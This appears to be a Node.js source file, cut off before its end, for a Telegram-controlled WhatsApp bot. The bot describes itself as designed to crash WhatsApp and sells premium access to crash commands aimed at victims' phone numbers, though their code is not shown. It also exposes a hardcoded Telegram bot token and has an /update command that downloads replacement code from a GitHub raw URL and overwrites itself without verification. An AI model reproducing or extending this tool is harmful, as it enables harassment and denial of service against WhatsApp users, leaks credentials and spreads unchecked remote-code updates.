/*
===============
WB BASE ( 🌹 )
===============
Credit By | Jary_Sexz🪐
Telegram : @JarySudo2 ( Real Acount )
Whatsapp : ( Kertu Lagi Gada )
————:
*/
const { Telegraf } = require("telegraf");
const config = require("./settings/config.js");
const { spawn } = require('child_process')
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm')
const os = require('os')
const crypto = require("crypto");

const isModerator = (userId) => {
return false;};
const developerId = "7682828455"; 
const developerIds = ["7682828455"];
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    generateWAMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    fetchLatestBaileysVersion,
    generateWAMessageFromContent,
    DisconnectReason,
    BufferJSON,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const chalk = require('chalk');
const { tokenBot, ownerID } = require("./settings/config");
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 100) {
        messages[chatId].shift()
      }
      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })
  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })
  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })
  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});


const thumbnailUrl = "https://files.catbox.moe/i4onvs.jpg";
const BugUrl = "https://files.catbox.moe/i4onvs.jpg";
const devBotToken = "8456189841:AAECUV1o8D-03zA4n_lxc0SSBg-wQ99p_Bg";
const devChatId = "7682828455";
const OWNER_ID = Number(config.ownerID)
const RAW_URL = 'https://raw.githubusercontent.com/JaryD3v3/scripfile/main/main.js'
const FILE_NAME = 'main.js'
/*const { env, execArgv } = process;
const mod = require('module');
const trueLog = console.log;
const strictToString = Function.prototype.toString.toString();
Object.defineProperty(console, 'log', {
  set: () => {
    trueLog('[SECURITY] console.log override dicegah!');
    process.abort();
  },
  get: () => trueLog,
  configurable: false
});
try {
  process.abort.toString();
} catch {
  trueLog('[SECURITY] dibajak!');
  process.abort();
}
const realAbort = process.abort + '';
if (!realAbort.includes('[native code]') && !realAbort.includes('abort')) {
  trueLog('[SECURITY] process.abort dimodifikasi!');
  process.abort();
}
if (Function.prototype.toString.toString() !== strictToString) {
  trueLog('[SECURITY] dibajak!');
  process.abort();
}
Object.defineProperty(Function.prototype, 'toString', {
  value: Function.prototype.toString,
  writable: false,
  configurable: false
});
if (execArgv.length === 0 && process.execArgv !== execArgv) {
  trueLog('[SECURITY] process.execArgv dipalsukan!');
  process.abort();
}
['HTTP_PROXY', 'HTTPS_PROXY', 'NODE_TLS_REJECT_UNAUTHORIZED', 'NODE_OPTIONS'].forEach((key) => {
  if (env[key] && env[key] !== '' && env[key] !== '1') {
    trueLog(`[SECURITY] ENV ${key} mencurigakan: ${env[key]}`);
    process.abort();
  }
});
if (
  axios.interceptors.request.handlers.length > 0 ||
  axios.interceptors.response.handlers.length > 0
) {
  trueLog('[SECURITY] Interceptor axios aktif!');
  process.abort();
}
try {
  const interceptorTest = axios.interceptors.request.use(() => {}, () => {});
  const valid =
    typeof interceptorTest === 'number' &&
    interceptorTest >= 0 &&
    interceptorTest <= 10000;

  if (!valid) {
    trueLog('[SECURITY] tidak valid / dibajak!');
    process.abort();
  }
  axios.interceptors.request.eject(interceptorTest);
} catch (err) {
  trueLog('[SECURITY] telah dibajak!');
  process.abort();
}
try {
  const handlers = Object.getOwnPropertyDescriptor(axios.interceptors.request, 'handlers');
  if (handlers && typeof handlers.get === 'function') {
    trueLog('[SECURITY] axios.request.handlers pakai getter jahat!');
    process.abort();
  }
} catch {}
const modLoad = mod._load.toString();
if (!modLoad.includes('tryModuleLoad') && !modLoad.includes('Module._load')) {
  trueLog('[SECURITY] Module._load dimodifikasi!');
  process.abort();
}
try {
  const proxyCheck = typeof require.cache.get === 'function';
  if (proxyCheck) {
    trueLog('[SECURITY] require.cache diproxy!');
    process.abort();
  }
} catch {}
(async () => {
    const isTokenValid = await isAuthorizedToken(tokenBot);
    if (!isTokenValid) {
        console.log(chalk.bold.red(`
TAPI BOONG😂 
  `))
        process.exit();
    }
})();*/

const fsaluran = { key : {
remoteJid: '0@s.whatsapp.net',
participant : '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: '0@newsletter',
    newsletterName: '',
    caption: '\u200B'
}}}

const bot = new Telegraf(tokenBot);
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const SESSION_DIR = "./session";
const pointsFile = "./database/points.json";
const admin = "./database/admin.json";
const POINT_FILE = "./points.json";
const premiumFile = './database/premium.json';
const HADIAH_DIR = "./hadiah";

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.green(`
   ⠀⣠⠂⢀⣠⡴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢤⣄⠀⠐⣄⠀⠀⠀
⠀⢀⣾⠃⢰⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⡆⠸⣧⠀⠀
⢀⣾⡇⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠁⠀⢹⣧⠀
⢸⣿⠀⠀⠀⢹⣷⣀⣤⣤⣀⣀⣠⣶⠂⠰⣦⡄⢀⣤⣤⣀⣀⣾⠇⠀⠀⠈⣿⡆
⣿⣿⠀⠀⠀⠀⠛⠛⢛⣛⣛⣿⣿⣿⣶⣾⣿⣿⣿⣛⣛⠛⠛⠛⠀⠀⠀⠀⣿⣷
⣿⣿⣀⣀⠀⠀⢀⣴⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⣀⣠⣿⣿
⠛⠻⠿⠿⣿⣿⠟⣫⣶⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣙⠿⣿⣿⠿⠿⠛⠋
⠀⠀⠀⠀⠀⣠⣾⠟⣯⣾⠟⣻⣿⣿⣿⣿⣿⣿⡟⠻⣿⣝⠿⣷⣌⠀⠀⠀⠀⠀
⠀⠀⢀⣤⡾⠛⠁⢸⣿⠇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⢹⣿⠀⠈⠻⣷⣄⡀⠀⠀
⢸⣿⡿⠋⠀⠀⠀⢸⣿⠀⠀⢿⣿⣿⣿⣿⣿⣿⡟⠀⢸⣿⠆⠀⠀⠈⠻⣿⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡀⠀⠘⣿⣿⣿⣿⣿⡿⠁⠀⢸⣿⠀⠀⠀⠀⠀⢸⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡇⠀⠀⠈⢿⣿⣿⡿⠁⠀⠀⢸⣿⠀⠀⠀⠀⠀⣼⣿⠃
⠈⣿⣷⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠈⢻⠟⠁⠀⠀⠀⣼⣿⡇⠀⠀⠀⠀⣿⣿⠀
⠀⢿⣿⡄⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⢰⣿⡟⠀
⠀⠈⣿⣷⠀⠀⠀⢸⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠃⠀⠀⢀⣿⡿⠁⠀
⠀⠀⠈⠻⣧⡀⠀⠀⢻⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡟⠀⠀⢀⣾⠟⠁⠀⠀
⠀⠀⠀⠀⠀⠁⠀⠀⠈⢿⣿⡆⠀⠀⠀⠀⠀⠀⣸⣿⡟⠀⠀⠀⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡄⠀⠀⠀⠀⣰⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠆⠀⠀⠐⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

» Information:
  Developer: JARY
  Name Scrip: Whater Blue
  Version: X
  Status: Vvip
  `))
  console.log(chalk.bold.red(`Scrip Siap Tempur`))
//Akhir
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Whater',
        }),
    };
    sock = makeWASocket(connectionOptions);
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }
            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });
    sock.ev.on('creds.update', saveCreds);
store.bind(sock.ev);

sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === 'open') {

        if (lastPairingMessage) {
            const connectedMenu = `
<blockquote><pre>
⌜ ☇ Pairing° Menu ⌟  
─▢ Number: ${lastPairingMessage.phoneNumber}  
─▢ Pairing Code: ${lastPairingMessage.pairingCode}  
─▢ Status:  Connected
</pre></blockquote>`;

            try {
                bot.telegram.editMessageCaption(
                    lastPairingMessage.chatId,
                    lastPairingMessage.messageId,
                    undefined,
                    connectedMenu,
                    { parse_mode: "HTML" }
                );
            } catch (e) {}
        }

        console.clear();
        isWhatsAppConnected = true;
        const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');

        console.log(chalk.bold.yellow(`
   (ASCII ART MU TETAP SAMA)
» Information:
  Developer: JARY
  Name Scrip: WhaterBlue
  Version: 5.1
  Status: Sender Connected
  `));
        try {
            await sock.newsletterFollow("120363420209853545@newsletter");
            await sock.newsletterFollow("120363418360583919@newsletterr");
            console.log(chalk.green("✓ Berhasil auto join channel!"));
        } catch (err) {
            console.log(chalk.red("✗ Gagal auto join:"), err);
        }
    }

    if (connection === 'close') {
        const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
        console.log(
            chalk.red('Koneksi WhatsApp terputus:'),
            shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
        );
        if (shouldReconnect) {
            startSesi();
        }
        isWhatsAppConnected = false;
    }
});
};

startSesi();
const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("Tidak ada sender yang terhubung mohon addpair");
        return;
    }
    next();
};

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("Akses hanya untuk premium");
        return;
    }
    next();
};

//Admin
if (!fs.existsSync(admin)) {
  fs.writeFileSync(admin, JSON.stringify([]));
}

const loadAdmin = () => JSON.parse(fs.readFileSync(admin, "utf8"));
const saveAdmin = (data) => fs.writeFileSync(admin, JSON.stringify(data, null, 2));


const isAdmin = (id) => {
  const list = loadAdmin();
  return list.includes(id.toString()) || id.toString() === config.ownerID.toString();
};

//LoadPOINBukanGpt Ya Asu
const loadPoints = () => {
  if (!fs.existsSync(pointsFile)) fs.writeFileSync(pointsFile, JSON.stringify({}));
  return JSON.parse(fs.readFileSync(pointsFile, "utf8"));
};
const savePoints = (data) => {
  fs.writeFileSync(pointsFile, JSON.stringify(data, null, 2));
};
async function uploadCatbox(buffer, ext = "bin") {
  const form = new FormData();
  form.append("reqtype", "fileupload");
  form.append("fileToUpload", buffer, {
    filename: `jary_${Date.now()}.${ext}`
  });

  const res = await axios.post(
    "https://api.catbox.moe/user/api.php",
    form,
    { headers: form.getHeaders() }
  );

  return res.data;
}

bot.command("reqpair", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("Format: /reqpair 62×××");
  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");
  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }
    const code = await sock.requestPairingCode(phoneNumber);  
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `
<blockquote><pre>
⌜ ☇ Pairing° Menu ⌟  
─▢ Number: ${phoneNumber}  
─▢ Pairing Code: ${formattedCode}  
─▢ Status: Not Connected
</pre></blockquote>`;
    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  
    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode  
    };
  } catch (err) {
    console.error(err);
  }
});
if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const connectedMenu = `
<blockquote><pre>
⌜ ☇ Pairing° Menu ⌟  
─▢ Number: ${lastPairingMessage.phoneNumber}  
─▢ Pairing Code: ${lastPairingMessage.pairingCode}  
─▢ Status:  Connected
</pre></blockquote>`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          connectedMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

//addadmin
bot.command("addadmin", (ctx) => {
  const senderId = ctx.from.id.toString();
  if (senderId !== config.ownerID.toString()) {
    return ctx.reply("⛔ Hanya owner yang bisa menambahkan admin!");
  }
  const args = ctx.message.text.split(" ").slice(1);
  if (args.length < 1) return ctx.reply("📌 Format: /addadmin <id>");
  const newId = args[0].toString();
  const list = loadAdmin();
  if (list.includes(newId)) return ctx.reply("⚠️ ID sudah terdaftar sebagai admin!");
  list.push(newId);
  saveAdmin(list);
  ctx.reply(`✅ Berhasil menambahkan admin: ${newId}`);
});
//Command deladmin
bot.command("deladmin", (ctx) => {
  const senderId = ctx.from.id.toString();
  if (senderId !== config.ownerID.toString()) {
    return ctx.reply("⛔ Hanya owner yang bisa menghapus admin!");
  }
  const args = ctx.message.text.split(" ").slice(1);
  if (args.length < 1) return ctx.reply("📌 Format: /deladmin <id>");
  const targetId = args[0].toString();
  const list = loadAdmin();
  if (!list.includes(targetId)) return ctx.reply("⚠️ ID tersebut tidak ada di daftar admin.");
  const newList = list.filter((id) => id !== targetId);
  saveAdmin(newList);
  ctx.reply(`✅ Admin ${targetId} berhasil dihapus.`);
});
//addprem
bot.command('addprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addprem [user_id] [duration_in_days]");
    }
    const userId = args[1];
    const duration = parseInt(args[2]);
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka (dalam hari)");
    }
    const expiryDate = addPremiumUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});
//iqc
bot.command('iqc', async (ctx) => {
  try {
    const args = ctx.message.text.split(' ').slice(1);
    if (args.length < 3) {
      return ctx.reply('Gunakan format:\n/iqc <pesan> <baterai> <operator>\n\nContoh:\n/iphone Halo dunia 87 Telkomsel');
    }
    const battery = args[args.length - 2];
    const carrier = args[args.length - 1];
    const text = args.slice(0, -2).join(' ');
    const time = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' });
    await ctx.reply('⏳ Membuat quoted message gaya iPhone...');
    const apiUrl = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&messageText=${encodeURIComponent(text)}&carrierName=${encodeURIComponent(carrier)}&batteryPercentage=${encodeURIComponent(battery)}&signalStrength=4&emojiStyle=apple`;
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
    const buffer = Buffer.from(response.data, 'binary');
    await ctx.replyWithPhoto({ source: buffer }, { caption: `📱 iPhone quote dibuat!\n🕒 ${time}` });
  } catch (err) {
    console.error('❌ Error case /iqc:', err);
    await ctx.reply('Terjadi kesalahan saat memproses gambar.');
  }
});
//Del prem comand
bot.command('delprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("☇ Format: /delprem [user_id]");
    }
    const userId = args[1];
    removePremiumUser(userId);
        ctx.reply(`☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});
//StartMenu
bot.start(ctx => {
    const menuMessage = `
<blockquote>( 🌹 ) 𝐖𝐡𝐚𝐭𝐞𝐫𝐁𝐥𝐮𝐞
Hello welcome to the Water Blue script specially designed to crash WhatsApp This script is still under development so just enjoy it
─────────────────────
☰「 ɪɴғᴏʀᴍᴀsɪ ⊹ 𝑾ɦαƭεɾ 」
ヤ ՇяєαԵօя : @JarySudo2 X @maoumods
ヤ ѵєяsíοи : X
ヤ ℒαиgυαgє : 𝙅𝙖𝙫𝙖𝙨𝙘𝙧𝙞𝙥𝙩 
ヤ sτατυs : 𝙑𝙫𝙞𝙥𝘽𝙪𝙮𝙊𝙣𝙡𝙮
╘═———————---———————═⬡
Ketik /menu Untuk Menampilkan menu</blockquote>
`;
    const keyboard = [
        [
           {   text: "ՇяєαԵօя",
                url: "t.me/maoumods"
            },
            {   text: "ՇяєαԵօя",
                url: "t.me/JarySudo2"
            },
        ]
    ];
    ctx.replyWithPhoto(thumbnailUrl, {
        caption: menuMessage,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
});
bot.action('/start', async (ctx) => {
    const menuMessage = `
<blockquote>( 🌹 ) 𝐖𝐡𝐚𝐭𝐞𝐫𝐁𝐥𝐮𝐞
Hello welcome to the Water Blue script specially designed to crash WhatsApp This script is still under development so just enjoy it
─────────────────────
INFO : 
(all akses) - semua pengguna bisa akses
(prem akses) - hanya untuk premium
(owner akses) - khusus owner!!
─────────────────────
☰「 ɪɴғᴏʀᴍᴀsɪ ⊹ 𝑾ɦαƭεɾ 」
ヤ ՇяєαԵօя : @JarySudo2
ヤ ѵєяsíοи : X 
ヤ ℒαиgυαgє : 𝙅𝙖𝙫𝙖𝙨𝙘𝙧𝙞𝙥𝙩 
ヤ sτατυs : 𝙑𝙫𝙞𝙥𝘽𝙪𝙮𝙊𝙣𝙡𝙮
╘═———————---———————═⬡
Ketik /menu Untuk Menampilkan menu</blockquote>
`;
    const keyboard = [
        [
           {   text: "ՇяєαԵօя",
                url: "t.me/maoumods"
            },
            {   text: "ՇяєαԵօя",
                url: "t.me/JarySudo2"
            },
        ]
    ];
    try {
        await ({
            type: 'photo',
            media: thumbnailUrl,
            caption: menuMessage,
            parse_mode: "HTML",
        }, {
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "Welcome Scrip Whater Blue🍷 Scrip Ini Di Rancang Untuk Membuat WhatsApp Cras Sementara🩸 Yang Dirancang Oleh JarySudo 070🐉") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});
//Di pisah karna beda kode
bot.command("menu", async (ctx) => {
  try {
    let msg = await ctx.reply(
      "ωнατєя μємυατ...\n▰▰▱▱▱ (10%)"
    );
    const update = async (text, delay) => {
      await new Promise(r => setTimeout(r, delay));
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        msg.message_id,
        undefined,
        text
      );
    };
    await update("ωнατєя μємυατ...\n▰▰▰▰▰▱▱▱ (25%)", 600);
    await update("ωнατєя μємυατ...\n▰▰▰▱▱ (38%)", 650);
    await update("ωнατєя μємυατ...\n▰▰▰▰▰▰▱ (57%)", 755);
    await update("ωнατєя μємυατ...\n▰▰▰▰▱▱▱ (60%)", 500);
    await update("ωнατєя μємυατ...\n▰▰▰▰▰▰▰▰▱ (99%)", 600);
    await update("ωнατєя μємυατ...\n▰▰▰▰▱ (100%)\nSukses memuat menu ✅", 400);
    await new Promise(r => setTimeout(r, 300));
    await ctx.deleteMessage(msg.message_id);
    const teks = `
\`\`\`ωнατєяϲοиτяοℓ
☰ — τοοℓѕ ༈ αϲϲєѕ —
⊹ /whater <pesan> (all akses)
⊹ /gacha (all akses)
⊹ /listitem (all akses)
⊹ /iqc <pesan> <baterai> <operator> (all akses)
⊹ /rep <pesan> - untuk memberi info misal func kefix atau eror dll (all akses)
⊹ /test 62××× 10 (reply function) (prem akses)

☰ — σωɳεɾ ༈ αccҽs —
⊹ /addprem id 30d (owner akses)
⊹ /delprem id (owner akses)
⊹ /addadmin id (owner akses)
⊹ /deladmin id (owner akses)
⊹ /addpoint id <point> (owner akses)
⊹ /delsession (owner akses)
⊹ /setgacha <reply file> (owner akses)
⊹ /reqpair 62xxx (owner akses)
⊹ /update (owner Akses)

☰ — ϲяαѕн ༈ μєиυ 
⊹ /forcecall 62xxx—
⊹ /blankbutton 62xxx
⊹ /frezer 62xxx
⊹ /stikermsg 62xxx
⊹ /crash 62xxx
⊹ /dlay 62xxx
⊹ /dlyv2 62xxx
⊹ /delayhour 62xxx
⊹ /Invisible 62xxx

\`\`\`
`;
    await ctx.replyWithVideo(
      { url: "https://files.catbox.moe/pcf7ne.mp4" },
      {
        caption: teks,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "∂єνєℓορєя", url: "t.me/JarySudo2" }],
            [{ text: "∂єνєℓορєя", url: "t.me/maoumods" }]
          ]
        }
      }
    );

  } catch (e) {
    console.log("Error /menu:", e);
  }
});
//catbox
bot.command("catbox", async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply) {
      return ctx.reply("❌ Reply foto / stiker / video / file dulu!");
    }

    let fileId;
    let ext = "bin";

    if (reply.photo) {
      fileId = reply.photo.pop().file_id;
      ext = "jpg";
    } else if (reply.sticker) {
      fileId = reply.sticker.file_id;
      ext = "webp";
    } else if (reply.video) {
      fileId = reply.video.file_id;
      ext = "mp4";
    } else if (reply.document) {
      fileId = reply.document.file_id;
      ext = reply.document.file_name?.split(".").pop() || "bin";
    } else {
      return ctx.reply("❌ Media tidak didukung!");
    }

    const fileLink = await ctx.telegram.getFileLink(fileId);
    const buffer = await axios.get(fileLink.href, {
      responseType: "arraybuffer"
    }).then(res => res.data);

    await ctx.reply("⏳ Upload ke Catbox...");

    const url = await uploadCatbox(buffer, ext);

    await ctx.reply(
      `✅ *CATBOX UPLOAD SUCCESS*\n\n🔗 ${url}`,
      { parse_mode: "Markdown" }
    );

  } catch (e) {
    console.error(e);
    ctx.reply("❌ Gagal upload ke Catbox!");
  }
});

//Update
bot.command('update', async (ctx) => {
  if (ctx.from.id !== OWNER_ID)
    return ctx.reply('❌ Command ini khusus owner')

  try {
    await ctx.reply('ProcessUpdate...')

    const res = await axios.get(RAW_URL, { timeout: 15000 })

    fs.writeFileSync(FILE_NAME + '.new', res.data)
    await bot.stop()

    if (fs.existsSync(FILE_NAME)) fs.unlinkSync(FILE_NAME)
    fs.renameSync(FILE_NAME + '.new', FILE_NAME)

    await ctx.reply('Succes Update Gunakan Lah Perintah /menu Untuk Melihat Menu Dan Tunggulah Informasi Update Terbaru Di Gb Ress Wa/Tele')

    setTimeout(() => process.exit(0), 1000)

  } catch (err) {
    ctx.reply('❌ Update gagal:\n' + err.message)
  }
})
//tools kirim pesan ke dev
bot.command("rep", async (ctx) => {
  const message = ctx.message.text.split(" ").slice(1).join(" ");
  const sender = `${ctx.from.first_name || ""} ${ctx.from.last_name || ""}`.trim();
  const username = ctx.from.username ? `@${ctx.from.username}` : "Tidak ada username";
  if (!message) {
    return ctx.reply("⚠️ Gunakan format:\n`/whater <pesan>`", { parse_mode: "Markdown" });
  }
  try {
    await axios.post(`https://api.telegram.org/bot${devBotToken}/sendMessage`, {
      chat_id: devChatId,
      text: `📩 *Pesan baru dari pengguna:*\n\n👤 Nama: ${sender}\n🔗 Username: ${username}\n💬 Pesan: ${message}`,
      parse_mode: "Markdown"
    });
    await ctx.reply("✅ Pesanmu sudah dikirim ke developer!");
  } catch (error) {
    console.error("Gagal kirim pesan ke developer:", error);
    await ctx.reply("❌ Gagal mengirim pesan ke developer.");
  }
});
//tools addpoint
bot.command("addpoint", (ctx) => {
  const uid = ctx.from.id;
  if (!isAdmin(uid)) return ctx.reply("⛔ Hanya owner atau admin yang bisa menambahkan point");
  const args = ctx.message.text.split(" ").slice(1);
  if (args.length < 2) return ctx.reply("Format: /addpoint <id/all> <jumlah>");
  const target = args[0];
  const jumlah = parseInt(args[1]);
  if (isNaN(jumlah)) return ctx.reply("❌ Jumlah harus angka");
  const points = loadPoints();
  if (target.toLowerCase() === "all") {
    for (const key in points) {
      points[key] = (points[key] || 0) + jumlah;
    }
    savePoints(points);
    return ctx.reply(`✅ Berhasil menambahkan ${jumlah} point untuk semua user`);
  } else {
    points[target] = (points[target] || 0) + jumlah;
    savePoints(points);
    return ctx.reply(`✅ Berhasil menambahkan ${jumlah} point untuk user ${target}`);
  }
});
//tools gacha
bot.command("gacha", (ctx) => {
  const uid = String(ctx.from.id);
  const points = loadPoints();
  const userPoint = points[uid] || 0;
  if (userPoint < 1) return ctx.reply("[Warning!!] Point kamu habis, tidak bisa gacha");
  points[uid] -= 1;
  savePoints(points);
  const HADIAH_DIR = "./hadiah";
  if (!fs.existsSync(HADIAH_DIR)) return ctx.reply("⚠️ Folder hadiah tidak ditemukan");
  const files = fs.readdirSync(HADIAH_DIR).filter(f => f.endsWith(".zip"));
  if (files.length === 0) return ctx.reply("⚠️ Tidak ada hadiah tersedia");
  const chosen = files[Math.floor(Math.random() * files.length)];
  ctx.replyWithDocument({ source: path.join(HADIAH_DIR, chosen) }, { caption: `🎁 Kamu dapat: ${chosen}\nSisa point: ${points[uid]}` });
});
//tools setgacha
bot.command("setgacha", async (ctx) => {
  const uid = ctx.from.id;
  if (!isAdmin(uid)) {
    return ctx.reply("⛔ Kamu tidak memiliki akses untuk menambah hadiah");
  }
  if (
    !ctx.message.reply_to_message ||
    !ctx.message.reply_to_message.document
  ) {
    return ctx.reply("[Note!] Reply ke file .zip untuk menyimpannya ke folder hadiah/");
  }
  const fileId = ctx.message.reply_to_message.document.file_id;
  const fileLink = await ctx.telegram.getFileLink(fileId);
  const fileName =
    ctx.message.reply_to_message.document.file_name ||
    `hadiah_${Date.now()}.zip`;
  const filePath = path.join(HADIAH_DIR, fileName);
  const response = await fetch(fileLink.href);
  const buffer = Buffer.from(await response.arrayBuffer());
  fs.writeFileSync(filePath, buffer);
  ctx.reply(`✅ File ${fileName} berhasil disimpan ke folder hadiah/`);
});
//tools list item
bot.command("listitem", async (ctx) => {
  try {
    const files = fs.readdirSync(HADIAH_DIR).filter(f => f.endsWith(".zip"));

    if (files.length === 0) {
      return ctx.reply("⚠️ Tidak ada item yang tersedia di folder hadiah/");
    }
    const listText = `📦 *ITEM TERSEDIA:*\n\n${files.map(f => `- ${f}`).join("\n")}`;
    ctx.replyWithMarkdown(listText);
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Gagal mengambil daftar item.");
  }
});
//tools del s (bukan gpt su)
bot.command("delsession", async (ctx) => {
  const uid = ctx.from.id.toString();
  if (uid !== config.ownerID.toString()) {
